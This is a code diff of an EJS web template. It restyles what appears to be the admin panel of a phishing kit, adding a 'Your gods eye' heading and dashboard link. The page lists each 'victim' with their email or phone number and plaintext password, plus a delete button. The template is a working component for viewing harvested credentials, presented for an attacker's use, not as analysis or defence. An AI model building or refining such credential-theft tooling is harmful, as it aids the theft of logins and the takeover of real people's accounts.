@@ -2,22 +2,31 @@
 <html lang="en">
 <head>
     <title>View Victims</title>
+    <link rel="stylesheet" href="/css/view-victim.css">
 </head>
 <body>
-    <h2>Victim Details</h2>
+    <div class="gods-eye">
+    <h2>Your gods eye</h2>
+    <a href="/dashboard" class="back-to-dashboard">Back to Dashboard</a>
+
     <ul>
         <% if (victims && victims.length > 0) { %>
             <% victims.forEach(victim => { %>
                 <li>
-                    Email/Number: <%= victim.emailOrNumber %>, Password: <%= victim.password %>
+                    <div class="details">
+                        <strong>Email/Number:</strong> <%= victim.emailOrNumber %>
+                        <strong>Password:</strong> <%= victim.password %>
+                    </div>
                     <form action="/delete-victim/<%= victim._id %>" method="POST" style="display:inline;">
                         <button type="submit">Delete</button>
                     </form>
                 </li>
-            <% }); %>
-        <% } else { %>
-            <p>No victim data found.</p>
-        <% } %>
+                
+                <% }); %>
+                <% } else { %>
+                    <p>No victim data found.</p>
+                    <% } %>
     </ul>
+</div>
 </body>
 </html>
